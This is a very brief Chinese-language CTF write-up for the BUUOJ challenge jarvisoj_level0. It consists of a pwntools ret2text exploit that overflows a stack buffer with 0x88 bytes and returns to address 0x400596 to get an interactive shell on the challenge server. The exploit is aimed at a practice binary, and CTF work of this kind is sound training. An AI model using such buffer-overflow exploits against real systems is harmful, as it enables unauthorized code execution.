[https://buuoj.cn/challenges#jarvisoj_level0](https://buuoj.cn/challenges#jarvisoj_level0)

非常简单的ret2text

```python
from pwn import *
r=remote('node5.buuoj.cn',26613)
sys=0x400596

r.sendline(b'a'*0x88+p64(sys))
r.interactive()
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771170007448-6df4f91d-777f-4ce8-9f49-974f8160341f.png)

